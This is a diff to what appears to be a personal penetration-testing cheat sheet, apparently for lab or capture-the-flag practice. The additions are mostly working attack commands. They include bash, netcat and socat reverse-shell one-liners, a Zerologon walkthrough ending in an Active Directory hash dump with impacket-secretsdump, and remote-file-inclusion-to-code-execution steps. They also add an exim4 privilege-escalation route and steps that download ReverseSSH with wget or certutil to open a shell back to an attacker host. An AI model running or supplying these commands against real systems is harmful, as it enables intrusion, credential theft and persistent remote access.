@@ -46,6 +46,16 @@ bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1
 Netcat Reverse Shell One-Liner
 nc -e /bin/sh <attacker IP> <attacker port>
 
+----------------------------------------------------------
+
+Socat Reverse Shell One-Liner
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+
+
 
 
 ----------------------------------------------------------
@@ -889,6 +899,9 @@ Master file				Map(s)							Notes
 
 
 
+------------------------------------------------------------------------------------------------------
+
+EXPLOITING VULNERABILITIES
 
 
 
@@ -896,19 +909,380 @@ Master file				Map(s)							Notes
 
 
 
+
+
+
+
+
+
+
+EXPLOITING ZEROLOGON VULN
+
+- This only works if the machine has the netlogon RPC port open (essentially, it must be an active directory server)
+- First, you must acquire the hostname(netbios name) and domain name of the machine. You can do this with a standard nmap scan (smb-os-discovery script. it seems to be part of the normal scan) of the target 
+- Use the metasploit module "auxiliary/admin/dcerpc/cve_2020_1472_zerologon" to reset the password of the machine. it will reset the password to empty.
+- You can then run the following to acquire hashes of users in the active directory system
+        impacket-secretsdump -no-pass '#DOMAIN_NAME#/#NETBIOS_NAME#$@#IP_ADDRESS#'
+e.g     impacket-secretsdump -no-pass 'lab.secdojo.local/SRV-DC1$@172.16.40.212'
+
+
+
+
+
+
+
+
+
+--------------------------------------------------------------------------------------------------
+RFI (Remote File Inclusion)
+
+
+
+RFI TO RCE
+---------------------------------------------
+
+via HTTP
+The attacker can host a PHP code and access it through the HTTP protocol using RFI.
+
+# Create phpinfo.php
+echo '<?php phpinfo(); ?>' > phpinfo.php
+
+# Start a web server
+python3 -m http.server 80
+
+# Exploit the RFI to fetch the remote phpinfo.php file
+curl '#URL#/?#PARAMETER#=http://#VICTIM_IP#/phpinfo.php'
+
+
+
+
+
+
+via FTP
+The attacker can host a PHP code and access it through the RFI protocol using RFI.
+He can use the python library pyftpdlib to start a FTP server.
+
+# Start FTP server
+sudo python3 -m pyftpdlib -p 21
+
+# Exploit the RFI to fetch the remote phpinfo.php file
+curl '#URL#/?#PARAMETER#=ftp://#VICTIM_IP#/phpinfo.php'
+
+Note: PHP uses the anonymous credentials to authenticate to the FTP server. If the attacker needs to use custom credentials, he can authenticate as follows:
+curl '#URL#/?#PARAMETER#=ftp://#USERNAME#:#PASSWORD#@#VICTIM_IP#/phpinfo.php'
+
+
+
+
+via SMB
+Sometimes, the vulnerable web application is hosted on a Windows Server, meaning the attacker could log into a SMB Server to store the arbitrary PHP code.
+
+# Start SMB server
+sudo python3 smbserver.py -smb2support share $(pwd)
+
+# The PHP script can then be included by using a UNC Path. Exploit the RFI to fetch the remote phpinfo.php file
+curl '#URL#/?#PARAMETER#\\#VICTIM_IP#/phpinfo.php'
+
+----------------------------------------------------------------------------------------------------
+MINI-TRICKS
+
+
+
+
+
+
+
+TO DOWNLOAD ALL FILES FROM AN FTP SERVER AT ONCE
+
+wget -m ftp://username:password@#IP_ADDRESS#
+or
+wget -m --user #USERNAME# --pass #PASSWORD# ftp://#IP_ADDRESS#
+
+
+
+
+
+TO BRUTEFORCE A JULIUS CAESAR CIPHER
+
+https://www.dcode.fr/caesar-cipher
+
+
+Find all files belonging to a particular user
+find / -user #USER_NAME# -type f 2>/dev/null
+
+
+
+
+
+NEW PATTERN TO ACQUIRE AN INTELLIGENT SHELL
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+Ctrl + Z
+stty raw -echo; fg
+stty rows 38 columns 116
+
+
+
+
+
+
+
+***********************************
+try this
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
+***********************************
+
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------
+
+TIPS
+
+- Always check the SSL certificate in case there are extra websites tagged to the ip address as virtual hosts. You can then go to these extra websites after adding them to the /etc/hosts file
+  Command Example:
+  sudo echo "#IP_ADDRESS# #WEBSITE_1# #WEBSITE_2#" >> /etc/hosts
+
+
+
+- What an AES encryption looks like
+    Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
+    Key = my cool password
+    IV = abcdefghijklmanopqrstuvwxyz
+    Mode = CBC
+    Input = hex
+    Output = raw
+    
+    #PSST! CYBERCHEF TOOL CAN HELP
+
+
+
+
+
+- Chech if cc is available to compile binaries
+    which cc
+    cc -o exploit_output exploit_source_code.c
+    
+    check for clang too
+    
+    
+
+- If a binary looking code does not decode as standard binary despite reversing it and adjusting the byte count(use cyberchef)
+    Try using Spoon Binary Encoding
+
+
+
+
+- When it becomes necessary to crack a password, and you know the password length, you can generate a wordlist containing all possible combinations using crunch
+    crunch 18 18 -t 'The Ice King s@@@@' > file.txt
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    the 18 18 specifies the minimum and maximum length to be 18
+    the -t flag indicates that the wordlist generation should follow the specified pattern (e.g: @@god@@@@), with the alphabets remaining static and the symbols (@'s, ,'s, %'s, and ^'s) changing:
+              @ will insert lower  case  charac‐
+              ters
+              ,  will  insert upper case charac‐
+              ters
+              % will insert numbers
+              ^ will insert symbols
+
+
+
+
+
+
+
+- You can also check other suid binaries for possible privilege escalation exploitation despite them not being in gtfobins; pkexec, exim4
+
+    How to exploit exim4
+    - First, find the port it runs on by reading the conf file "cat /etc/exim4/update-exim4.conf.conf"
+    - The line 'dc_local_interfaces' shows you the port and ip address(most likely localhost) that it's running on.
+    - An exploit for priv esc can be clone from "https://github.com/AzizMea/CVE-2019-10149-privilege-escalation".
+    - Edit the wizard python file and match the port that exim runs on
+    - Now run the python file. You might have to run it twice, but you should successfully acquire root privileges
+    
+    
+    
+    
+- For another site to reveal steganography, check out
+    fotoforensics.com
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+----------------------------------
+**********************************************
+smbmap -u "" -H #IP_ADDRESS#
+smbclient -U "" -L \\\\#IP_ADDRESS#
+
+
+
+
+Sometimes, you might be able to authenticate using rpcclient(I think a particular port has to be open) without a password
+rpcclient -U "" #IP_ADDRESS#
+
+enumdomusers
+You'll then see users and groups. you might then be able kerberoast them.
+you can also (in rpcclient) query the rid in the users list to get more details account information
+queryuser 0x20d
+
+**********************************************
+
+
+
+
+***********************************************
+acquire sudo rights using sudo -i, sudo -s
+**********************************************
+
+
+
+
+
+
+
+
+*****************************************************8
+
+No TTY
+If for some reason you cannot obtain a full TTY you still can interact with programs that expect user input. In the following example, the password is passed to sudo to read a file:
+
+
+expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
+******************************************************
+
+
+
+
+
+TTY upgrade snippets
+script /dev/null -qc /bin/bash #/dev/null is to not store anything
+(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
+
+******************************************************
+
+Spawn shells from binaries
+
+Python
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+Bash
+echo os.system('/bin/bash')
+
+Sh
+/bin/sh -i
+
+Script
+script -qc /bin/bash /dev/null
+
+Perl
+perl -e 'exec "/bin/sh";'
+
+Perl
+perl: exec "/bin/sh";
+
+Ruby
+ruby: exec "/bin/sh"
+
+Lua
+lua: os.execute('/bin/sh')
+
+IRB
+IRB: exec "/bin/sh"
+
+VI
+vi: :!bash
+
+VI
+vi: :set shell=/bin/bash:shell
+
+NMAP
+nmap: !sh
+******************************************************
+
+
+ReverseSSH
+A convenient way for interactive shell access, as well as file transfers and port forwarding, is dropping the statically-linked ssh server ReverseSSH onto the target.
+
+Below is an example for x86 with upx-compressed binaries. For other binaries, check releases page.
+
+Prepare locally to catch the ssh port forwarding request:
+
+# Drop it via your preferred way, e.g.
+wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
+
+/dev/shm/reverse-ssh -v -l -p 4444
+(2a) Linux target:
+
+# Drop it via your preferred way, e.g.
+wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
+
+/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
+(2b) Windows 10 target (for earlier versions, check project readme):
+
+# Drop it via your preferred way, e.g.
+certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe
+
+reverse-ssh.exe -p 4444 kali@10.0.0.2
+If the ReverseSSH port forwarding request was successful, you should now be able to log in with the default password letmeinbrudipls in the context of the user running reverse-ssh(.exe):
+
+# Interactive shell access
+ssh -p 8888 127.0.0.1
+
+# Bidirectional file transfer
+sftp -P 8888 127.0.0.1
+
+
+***************************************************
+
+
+COMMANDS TO EXAMINE
+
+sudo bash -c 'for script in /etc/update-motd.d/*; do $script; done > /etc/motd'
 
 
 
 
 For a web-based shell, use "phpbash shell". Or you could use a webshell.
-
-
-
-
-
-
-
-
 
 
 
@@ -939,19 +1313,6 @@ http://#URL_HERE#/images/file.php#.jpg
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
 use torsocks for bash internet commands. It'll run the commands over tor
 
 
@@ -965,34 +1326,13 @@ use "strings" command to extract readablle text of 4 characters or more from fil
 
 
 
-
-
-
-
-
-
-
-
 https://gchq.github.io/CyberChef/				#CONTAINS A CRAP-TON OF UTILITIES YOU CAN USE IN EVERYDAY TECH STUFF
 
 
 
 
 
-
-
-
-
-
-
-
-
 https://securitytrails.com/					#CHECK HISTORICAL DATA OF A SERVER
-
-
-
-
-
 
 
 
